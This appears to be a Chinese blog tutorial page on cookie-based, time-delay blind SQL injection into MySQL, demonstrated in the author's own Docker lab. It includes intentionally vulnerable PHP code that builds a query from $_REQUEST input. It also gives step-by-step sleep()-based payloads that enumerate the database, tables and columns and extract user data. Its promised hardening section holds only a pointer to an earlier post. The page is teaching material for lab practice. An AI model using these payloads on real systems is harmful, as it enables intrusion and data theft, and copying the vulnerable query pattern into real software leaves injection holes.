@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>03,sql注入专题之mysql的cookie基于时间盲注入及其加固 | D&#39;Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负    总结一下sql注入，这个是通过cookie注入并且是用时间盲注">
+<meta name="keywords" content="web安全,sql注入,mysql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="03,sql注入专题之mysql的cookie基于时间盲注入及其加固">
+<meta property="og:url" content="http://www.duwentao.top/2019/01/07/03,SQL注入之cookie注入基于时间盲注/index.html">
+<meta property="og:site_name" content="D&#39;Blog">
+<meta property="og:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负    总结一下sql注入，这个是通过cookie注入并且是用时间盲注">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://www.duwentao.top/images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108172234369-6939354.png">
+<meta property="og:image" content="http://www.duwentao.top/images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108180530105-6941930.png">
+<meta property="og:image" content="http://www.duwentao.top/images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108233413904-6961653.png">
+<meta property="og:image" content="http://www.duwentao.top/images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108233709357-6961829.png">
+<meta property="og:image" content="http://www.duwentao.top/images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108234150174-6962110.png">
+<meta property="og:image" content="http://www.duwentao.top/images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108234602091-6962362.png">
+<meta property="og:image" content="http://www.duwentao.top/images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108234746916-6962466.png">
+<meta property="og:updated_time" content="2019-01-09T15:29:08.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="03,sql注入专题之mysql的cookie基于时间盲注入及其加固">
+<meta name="twitter:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负    总结一下sql注入，这个是通过cookie注入并且是用时间盲注">
+<meta name="twitter:image" content="http://www.duwentao.top/images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108172234369-6939354.png">
+  
+    <link rel="alternate" href="/atom.xml" title="D&#39;Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">D&#39;Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://www.duwentao.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-03,SQL注入之cookie注入基于时间盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/01/07/03,SQL注入之cookie注入基于时间盲注/" class="article-date">
+  <time datetime="2019-01-06T16:00:00.000Z" itemprop="datePublished">2019-01-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      03,sql注入专题之mysql的cookie基于时间盲注入及其加固
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <html><body style="padding: 20px;"><marquee><span style="font-weight: bolder;font-size: 20px;color: red;"><a href="https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA?view_as=subscriber" target="_blank" rel="noopener"><font color="red">声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负</font></a></span></marquee></body></html>
+
+
+
+<p>总结一下sql注入，这个是通过cookie注入并且是用时间盲注</p>
+<a id="more"></a>
+
+
+
+<h2 id="一，环境部署"><a href="#一，环境部署" class="headerlink" title="一，环境部署"></a>一，环境部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull duwentao/sql-injection:3.0</span><br></pre></td></tr></table></figure>
+
+<h2 id="二，存在漏洞核心代码"><a href="#二，存在漏洞核心代码" class="headerlink" title="二，存在漏洞核心代码"></a>二，存在漏洞核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$username = $_REQUEST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_REQUEST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line">$db -&gt; set_charset(<span class="string">'utf8'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select password from users where username=\"&#123;$username&#125;\""</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color = \"red\"&gt;你当前执行的语句是:"</span>.$sql.<span class="string">"&lt;/font&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$reslut = $db-&gt;query($sql);</span><br><span class="line"><span class="comment">//$res =$reslut-&gt;fetch_row();</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"good"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上面这个代码是我们上一篇文章加固的代码，这个代码用上一种盲注肯定注入不了，我们一起探讨一下用其他方式是不是可以注入。</p>
+<h2 id="三，探讨cookie传参"><a href="#三，探讨cookie传参" class="headerlink" title="三，探讨cookie传参"></a>三，探讨cookie传参</h2><p>我们从核心代码里可以看到有个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$username = $_REQUEST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_REQUEST[<span class="string">"password"</span>];</span><br></pre></td></tr></table></figure>
+
+<p>$_REQUEST这个变量是即可以接收get，post传输的值，也可以接收cookie传的值，但是在php.ini里需要满足下面的要求,把682行修改成如下图所示的样子即可以接收cookie的值</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108172234369-6939354.png" alt="image-20190108172234369"></p>
+<p>用cookie穿参验证</p>
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108180530105-6941930.png" alt="image-20190108180530105"></p>
+<h2 id="四，开始注入"><a href="#四，开始注入" class="headerlink" title="四，开始注入"></a>四，开始注入</h2><p>1,验证注入点是否存在</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and sleep(5)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108233413904-6961653.png" alt="image-20190108233413904"></p>
+<p>2，查询当前使用的数据库，找到数据库sqltest</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin" and if(mid(database(),1,1)="s",sleep(5),1)<span class="comment">#;password=sss</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108233709357-6961829.png" alt="image-20190108233709357"></p>
+<p>3，查询数据库里的表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin" and if(ascii(mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'sqltest'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">117</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#;password=sss</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108234150174-6962110.png" alt="image-20190108234150174"></p>
+<p>4，最终找到表是“users”和“news”</p>
+<p>5，查users表里的列（id，username，password）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin" and if(ascii(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name = <span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="string">"117"</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#;password=sss</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108234602091-6962362.png" alt="image-20190108234602091"></p>
+<p>6，查数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin" and if(ascii(substring((<span class="keyword">select</span> username <span class="keyword">from</span> sqltest.users <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="string">"97"</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">#;password=sss</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A2%98/03%EF%BC%8Ccookie%E6%B3%A8%E5%85%A5/image-20190108234746916-6962466.png" alt="image-20190108234746916"></p>
+<h2 id="五，加固"><a href="#五，加固" class="headerlink" title="五，加固"></a>五，加固</h2><p>同上一篇文章</p>
+<h2 id="六，视频演示"><a href="#六，视频演示" class="headerlink" title="六，视频演示"></a>六，视频演示</h2><iframe width="560" height="315" src="https://www.youtube.com/embed/SCWtHAvim3c" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+
+
+<h2 id="七，sql注入拓展"><a href="#七，sql注入拓展" class="headerlink" title="七，sql注入拓展"></a>七，sql注入拓展</h2><p>1，$_REQUEST接收从get，post，cookie传的值。</p>
+<p>2，if（第一条语句，第二条语句，第三条语句）</p>
+<p>​    1), 如果第一条为真，则执行第二条.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(1,2,3);</span><br><span class="line"><span class="comment">--------------</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment">--------------</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">| <span class="keyword">if</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>) |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">|         <span class="number">2</span> |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>​    2),如果第一条不为真，则执行第三条</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if(0,2,3);</span><br><span class="line"><span class="comment">--------------</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"><span class="comment">--------------</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">| <span class="keyword">if</span>(<span class="number">0</span>,<span class="number">2</span>,<span class="number">3</span>) |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line">|         <span class="number">3</span> |</span><br><span class="line">+<span class="comment">-----------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<p>3,sleep函数是延时</p>
+<p>如果语句正确，则延时输出，如果语句错误则直接报错</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version(),sleep(5); </span><br><span class="line"><span class="comment">--------------</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">version</span>(),<span class="keyword">sleep</span>(<span class="number">5</span>)</span><br><span class="line"><span class="comment">--------------</span></span><br><span class="line"></span><br><span class="line">+<span class="comment">-----------+----------+</span></span><br><span class="line">| <span class="keyword">version</span>() | <span class="keyword">sleep</span>(<span class="number">5</span>) |</span><br><span class="line">+<span class="comment">-----------+----------+</span></span><br><span class="line">| <span class="number">5.1</span><span class="number">.73</span>    |        <span class="number">0</span> |</span><br><span class="line">+<span class="comment">-----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">5.00</span> sec)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ve(),sleep(5);     </span><br><span class="line">--------------</span><br><span class="line">select ve(),sleep(5)</span><br><span class="line">--------------</span><br><span class="line"></span><br><span class="line">ERROR 1305 (42000): FUNCTION sqltest.ve does not exist</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.duwentao.top/2019/01/07/03,SQL注入之cookie注入基于时间盲注/" data-id="cjwsmhkuo0004dkfyppw22tnw" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql/">mysql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/01/10/04,SQL注入之宽字节注入/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          04,sql注入专题之mysql的SQL注入之宽字节注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/01/07/02,SQL注入之POST注入盲注/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">02,sql注入专题之mysql的POST型盲注入及其加固</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/">node.js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php反序列化漏洞/">php反序列化漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vps/">vps</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-靶机/">web-靶机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-sql-injection/">web_sql_injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-upload-include/">web_upload_include</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xxe/">xxe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/二进制安全/">二进制安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/内网渗透/">内网渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客/">博客</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/变量覆盖/">变量覆盖</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/支付漏洞/">支付漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据结构/">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件上传/">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件包含漏洞/">文件包含漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/栈/">栈</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/私有云/">私有云</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/竞赛/">竞赛</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/脚本/">脚本</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/自考/">自考</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/逻辑漏洞/">逻辑漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/队列/">队列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶机/">靶机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/靶机渗透/">靶机渗透</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 12px;">CTF</a> <a href="/tags/access/" style="font-size: 10px;">access</a> <a href="/tags/c/" style="font-size: 14px;">c++</a> <a href="/tags/ctf/" style="font-size: 12px;">ctf</a> <a href="/tags/mysql/" style="font-size: 16px;">mysql</a> <a href="/tags/node-js/" style="font-size: 10px;">node.js</a> <a href="/tags/php/" style="font-size: 12px;">php</a> <a href="/tags/php反序列化漏洞/" style="font-size: 10px;">php反序列化漏洞</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/sql注入/" style="font-size: 18px;">sql注入</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/ssrf/" style="font-size: 10px;">ssrf</a> <a href="/tags/vps/" style="font-size: 10px;">vps</a> <a href="/tags/web-靶机/" style="font-size: 12px;">web-靶机</a> <a href="/tags/web-sql-injection/" style="font-size: 10px;">web_sql_injection</a> <a href="/tags/web-upload-include/" style="font-size: 10px;">web_upload_include</a> <a href="/tags/web安全/" style="font-size: 20px;">web安全</a> <a href="/tags/web漏洞/" style="font-size: 10px;">web漏洞</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/二进制安全/" style="font-size: 10px;">二进制安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/博客/" style="font-size: 10px;">博客</a> <a href="/tags/变量覆盖/" style="font-size: 10px;">变量覆盖</a> <a href="/tags/支付漏洞/" style="font-size: 10px;">支付漏洞</a> <a href="/tags/数据结构/" style="font-size: 12px;">数据结构</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/文件包含漏洞/" style="font-size: 10px;">文件包含漏洞</a> <a href="/tags/栈/" style="font-size: 10px;">栈</a> <a href="/tags/私有云/" style="font-size: 10px;">私有云</a> <a href="/tags/竞赛/" style="font-size: 10px;">竞赛</a> <a href="/tags/脚本/" style="font-size: 10px;">脚本</a> <a href="/tags/自考/" style="font-size: 14px;">自考</a> <a href="/tags/逻辑漏洞/" style="font-size: 10px;">逻辑漏洞</a> <a href="/tags/队列/" style="font-size: 10px;">队列</a> <a href="/tags/靶机/" style="font-size: 10px;">靶机</a> <a href="/tags/靶机渗透/" style="font-size: 12px;">靶机渗透</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/05/29/pwn学习01/">01,pwn学习系列</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/13/xxe总结/">xxe总结</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/09/PHP变量覆盖漏洞总结/">PHP变量覆盖总结</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/21/php反序列化漏洞/">php反序列化漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/文件包含漏洞总结/">文件包含漏洞总结</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 杜文涛<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
